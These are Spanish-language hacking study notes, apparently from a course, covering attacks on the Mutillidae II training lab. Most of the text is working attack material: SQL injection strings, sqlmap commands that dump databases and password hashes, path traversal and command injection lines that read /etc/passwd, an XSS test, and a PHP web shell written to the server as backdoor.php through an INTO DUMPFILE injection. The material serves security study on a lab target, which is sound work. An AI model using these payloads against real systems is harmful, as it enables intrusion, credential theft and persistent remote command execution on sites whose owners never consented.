# Explotación y hacking de vulnerabilidades en Hosts

## Instalación VM Ubuntu

[Ubuntu](https://ubuntu.com/download/desktop)

## Instalar Mutillidae II

[Mutillidae](https://github.com/webpwnized/mutillidae)

## Burp Suite

...

 - scraping:
skipfish -YO -o path+URL

## SQL Injection

'
' OR 1=1 -- 
' union select null,database(),null,null,null,null --
' union select null,load_file('/var/lib/mysql-files.ficheroimportante.txt'),null,null,null,null --
' union select null,sleep(20),null,null,null,null --
santiago' and 'h'='h
santiago' and 'h'='e
santiago' and substring(current_user(),1,1)='a
santiago' and sleep(10) and substring(current_user(),1,1)='a


### sqlmap
 - Guada la petición de BurpSuite.
 
sqlmap --flush-session -r Desktop/request.burp
 
 - Este comando saca el usuario actual de la basa de datos usando blind SQL injection y el parámetro username que es vulnerable. 

sqlmap -r Desktop/request.burp --ignore-redirects --technique B -p username -current-user

 - Otro más centrado, para tener la contraseña.

sqlmap -r Desktop/request.burp --ignore-redirects --batch --technique B -p username -U root@localhost --passwords

sqlmap -r Desktop/request.burp --ignore-redirects --batch --dbs -v 3

sqlmap -r Desktop/request.burp --ignore-redirects --batch --dump -D mutillidae

sqlmap -r Desktop/request.burp --ignore-redirects --batch --dump -T accounts -D mutillidae

## Path Traversal

 - Ejemplo:
 http://192.168.16.133/mutillidae/index.php?page=../../../../../../../../etc/passwd

 ## WebShells

 - Código:
 ```
 </php echo passthru($_GET['cmd']); ?>
 ```

 - Ejemplo:

 ```
' union select null,null,null,null,null,null,'<?phpif(!empty($_POST['cmd'])){$cmd=shell_exec($_POST['cmd']);}?><!DOCTYPEhtml><htmllang="en"><head><metacharset="utf-8"><metahttp-equiv="X-UA-Compatible"content="IE=edge"><metaname="viewport"content="width=device-width,initial-scale=1"><title>WebShell</title><style>*{-webkit-box-sizing:border-box;box-sizing:border-box;}body{font-family:sans-serif;color:rgba(0,0,0,.75);}main{margin:auto;max-width:850px;}pre,input,button{padding:10px;border-radius:5px;background-color:#efefef;}label{display:block;}input{width:100%;background-color:#efefef;border:2pxsolidtransparent;}input:focus{outline:none;background:transparent;border:2pxsolid#e6e6e6;}button{border:none;cursor:pointer;margin-left:5px;}button:hover{background-color:#e6e6e6;}.form-group{display:-webkit-box;display:-ms-flexbox;display:flex;padding:15px0;}</style></head><body><main><h1>WebShell</h1><h2>Executeacommand</h2><formmethod="post"><labelfor="cmd"><strong>Command</strong></label><divclass="form-group"><inputtype="text"name="cmd"id="cmd"value="<?=htmlspecialchars($_POST['cmd'],ENT_QUOTES,'UTF-8')?>"onfocus="this.setSelectionRange(this.value.length,this.value.length);"autofocusrequired><buttontype="submit">Execute</button></div></form><?phpif($_SERVER['REQUEST_METHOD']==='POST'):?><h2>Output</h2><?phpif(isset($cmd)):?><pre><?=htmlspecialchars($cmd,ENT_QUOTES,'UTF-8')?></pre><?phpelse:?><pre><small>Noresult.</small></pre><?phpendif;?><?phpendif;?></main></body></html>' INTO DUMPFILE '../../../../../../../var/www/html/mutillidae/backdoor.php
 ```

## Unrestricted File Upload

Subir un archivo con la webShell y luego con PathTraversal accede a el.

## HTML Injection y Cross-Site-Scripting (XSS)

```
<script> alert("vulnerable XSS")</script>
```

https://brightsec.com/blog/xss-attack/

https://owasp.org/www-community/attacks/xss/

## CSRF

https://owasp.org/www-community/attacks/csrf

## XSStrike

[XSStrike](https://github.com/s0md3v/XSStrike)

```
sudo apt-get install pip
git clone git@github.com:s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -h
sudo python3 xsstrike -u  "http://192.168.16.133/mutillidae/index.php?page=user-info.php" --timeout 50
```

## Command injection

test; cat /etc/passwd


## BurpSuite tools docs
https://portswigger.net/burp/documentation/desktop/tools





